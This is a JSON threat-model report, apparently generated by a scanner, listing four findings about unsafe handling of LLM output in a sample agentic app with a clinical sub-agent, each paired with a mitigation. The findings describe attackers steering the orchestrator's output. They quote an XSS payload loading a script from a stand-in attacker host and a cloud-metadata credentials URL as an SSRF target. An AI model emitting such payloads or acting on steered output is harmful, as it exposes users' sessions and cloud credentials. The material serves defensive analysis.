@@ -1,0 +1,190 @@
+[
+  {
+    "ruleId": "tachi/ai/llm",
+    "message": {
+      "text": "Improper output handling — client-side XSS via LLM response rendered in user browser: the Orchestrator's \"Response (HTTPS)\" data flow sends LLM-generated content directly to the User. If the client-side rendering layer injects this content into the DOM via `innerHTML` or equivalent without HTML entity encoding, an attacker who primes the Orchestrator to emit `<script src=\"//evil.example/steal.js\">` or an event-handler payload causes **client-side execution** in the victim's browser under the application's origin, with access to session cookies, CSRF tokens, and downstream user-authenticated APIs. This is a direct output-sink path: LLM Process → `Response (HTTPS)` → User browser render surface. FR-011 two-part gate confirmed: (1) LLM keyword on LLM Agent Orchestrator, (2) `Response (HTTPS)` data flow into User (browser render surface = client-side execution sink).",
+      "markdown": "Use `textContent` (not `innerHTML`) for all LLM response insertion into the DOM. If HTML rendering is required, pass model output through a strict HTML sanitization library (DOMPurify configured with `FORCE_BODY: true`, allowlist elements only). Deploy a Content Security Policy with `script-src 'self' 'nonce-<nonce>'` and no `unsafe-inline`. Do NOT rely on server-side filtering alone — apply encoding at each render point independently."
+    },
+    "level": "error",
+    "locations": [
+      {
+        "physicalLocation": {
+          "artifactLocation": {
+            "uri": "examples/agentic-app/sample-report/threats.md"
+          },
+          "region": {
+            "startLine": 1
+          }
+        },
+        "logicalLocations": [
+          {
+            "name": "LLM Agent Orchestrator",
+            "fullyQualifiedName": "Application Zone/LLM Agent Orchestrator",
+            "kind": "process"
+          }
+        ]
+      }
+    ],
+    "partialFingerprints": {
+      "primaryLocationLineHash": "9d1908c84077a5e9",
+      "findingId/v1": "OI-1",
+      "baselineRunId": "2026-04-19T03-20-30"
+    },
+    "properties": {
+      "baselineState": "unchanged",
+      "tags": [
+        "security",
+        "ai",
+        "llm",
+        "output-integrity",
+        "maestro-layer:L1"
+      ],
+      "maestro-layer": "L1 — Foundation Model",
+      "severity": "Critical",
+      "likelihood": "HIGH",
+      "impact": "HIGH",
+      "owasp_id": "LLM-05"
+    }
+  },
+  {
+    "ruleId": "tachi/ai/llm",
+    "message": {
+      "text": "Improper output handling — server-side execution via Tool Call Request: the Orchestrator emits \"Tool Call Request (JSON-RPC)\" messages to the MCP Tool Server containing LLM-synthesized parameters. If tool parameters are used to construct SQL queries, shell commands, template expressions, or filesystem paths server-side without parameterization or sanitization, an attacker who influences the Orchestrator's output achieves **server-side code/command execution** via the tool execution sink. Execution context: Tool Server backend, with service account credentials and External API access. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server = server-side execution sink.",
+      "markdown": "MCP Tool Server MUST parameterize all LLM-supplied inputs: use `cursor.execute(sql, params)` (not string interpolation) for SQL tools; `subprocess.run([cmd, arg1], shell=False)` for command tools; validate against a closed allowlist for enumerable parameters (tool names, resource identifiers). Implement a JSON Schema validator at the Tool Server ingress that rejects any request failing parameter type/format constraints before dispatch."
+    },
+    "level": "error",
+    "locations": [
+      {
+        "physicalLocation": {
+          "artifactLocation": {
+            "uri": "examples/agentic-app/sample-report/threats.md"
+          },
+          "region": {
+            "startLine": 1
+          }
+        },
+        "logicalLocations": [
+          {
+            "name": "LLM Agent Orchestrator",
+            "fullyQualifiedName": "Application Zone/LLM Agent Orchestrator",
+            "kind": "process"
+          }
+        ]
+      }
+    ],
+    "partialFingerprints": {
+      "primaryLocationLineHash": "dfa22757977c9e02",
+      "findingId/v1": "OI-2",
+      "baselineRunId": "2026-04-19T03-20-30"
+    },
+    "properties": {
+      "baselineState": "unchanged",
+      "tags": [
+        "security",
+        "ai",
+        "llm",
+        "output-integrity",
+        "maestro-layer:L1"
+      ],
+      "maestro-layer": "L1 — Foundation Model",
+      "severity": "Critical",
+      "likelihood": "HIGH",
+      "impact": "HIGH",
+      "owasp_id": "LLM-05"
+    }
+  },
+  {
+    "ruleId": "tachi/ai/llm",
+    "message": {
+      "text": "Improper output handling — SSRF via LLM-synthesized URL in Tool Call Request: the Orchestrator constructs \"Tool Call Request (JSON-RPC)\" messages containing URLs sourced from LLM output (e.g., \"fetch this URL\" tool calls). The MCP Tool Server executes outbound HTTP to the supplied URL using its own server-side network credentials and IAM role. An attacker who influences the Orchestrator's output can cause it to emit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or RFC 1918 internal service URLs. Execution context is **server-side**: the HTTP client runs with the Tool Server's IAM role and internal network reach. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server → External API (HTTP fetch) = SSRF-capable server-side execution sink.",
+      "markdown": "Implement URL allowlisting on the MCP Tool Server for all outbound HTTP tool invocations: reject any URL not in an explicit allowlist of permitted external hostnames. Block egress to RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), and cloud metadata endpoints via egress firewall rules. Validate URL scheme to `{http, https}` only. Apply DNS pinning (resolve once, verify IP is not private before dispatch)."
+    },
+    "level": "error",
+    "locations": [
+      {
+        "physicalLocation": {
+          "artifactLocation": {
+            "uri": "examples/agentic-app/sample-report/threats.md"
+          },
+          "region": {
+            "startLine": 1
+          }
+        },
+        "logicalLocations": [
+          {
+            "name": "LLM Agent Orchestrator",
+            "fullyQualifiedName": "Application Zone/LLM Agent Orchestrator",
+            "kind": "process"
+          }
+        ]
+      }
+    ],
+    "partialFingerprints": {
+      "primaryLocationLineHash": "6fbbb28e39fb5f3c",
+      "findingId/v1": "OI-3",
+      "baselineRunId": "2026-04-19T03-20-30"
+    },
+    "properties": {
+      "baselineState": "unchanged",
+      "tags": [
+        "security",
+        "ai",
+        "llm",
+        "output-integrity",
+        "maestro-layer:L1"
+      ],
+      "maestro-layer": "L1 — Foundation Model",
+      "severity": "High",
+      "likelihood": "MEDIUM",
+      "impact": "HIGH",
+      "owasp_id": "LLM-05"
+    }
+  },
+  {
+    "ruleId": "tachi/ai/llm",
+    "message": {
+      "text": "Improper output handling — server-side execution via Clinical Query / Context injection into the Orchestrator's downstream Tool Call Request: the Clinical Advisory Sub-Agent returns \"Clinical Summary + Recommendations\" to the Orchestrator via JSON-RPC. If the Orchestrator incorporates this clinical output into a subsequent Tool Call Request (JSON-RPC) to the MCP Tool Server without sanitization (e.g., embedding clinical recommendation text into a tool parameter), adversarial content injected into the clinical output can achieve server-side execution at the Tool Server. Execution context: **server-side** via the Orchestrator→ToolServer path. FR-011 two-part gate confirmed: (1) LLM keyword on Clinical Advisory Sub-Agent (\"clinical\", \"advisory\", \"medical\"), (2) `Clinical Summary + Recommendations` → Orchestrator → `Tool Call Request (JSON-RPC)` → MCP Tool Server = server-side execution sink downstream of sub-agent output.",
+      "markdown": "The Orchestrator MUST treat Clinical Advisory Sub-Agent outputs as untrusted inputs when constructing downstream Tool Call Requests: apply output sanitization and allowlist-based parameter validation before incorporating clinical recommendation text into JSON-RPC parameters. Never interpolate raw clinical output directly into tool invocation parameters. Apply the same parameterization and schema-validation controls as for direct LLM output (OI-2 mitigations)."
+    },
+    "level": "error",
+    "locations": [
+      {
+        "physicalLocation": {
+          "artifactLocation": {
+            "uri": "examples/agentic-app/sample-report/threats.md"
+          },
+          "region": {
+            "startLine": 1
+          }
+        },
+        "logicalLocations": [
+          {
+            "name": "Clinical Advisory Sub-Agent",
+            "fullyQualifiedName": "Application Zone/Clinical Advisory Sub-Agent",
+            "kind": "process"
+          }
+        ]
+      }
+    ],
+    "partialFingerprints": {
+      "primaryLocationLineHash": "e9adf5e8a4c7d3e4",
+      "findingId/v1": "OI-4",
+      "baselineRunId": "2026-04-19T03-20-30"
+    },
+    "properties": {
+      "baselineState": "unchanged",
+      "tags": [
+        "security",
+        "ai",
+        "llm",
+        "output-integrity",
+        "maestro-layer:L7"
+      ],
+      "maestro-layer": "L7 — Agent Ecosystem",
+      "severity": "High",
+      "likelihood": "MEDIUM",
+      "impact": "HIGH",
+      "owasp_id": "LLM-05"
+    }
+  }
+]
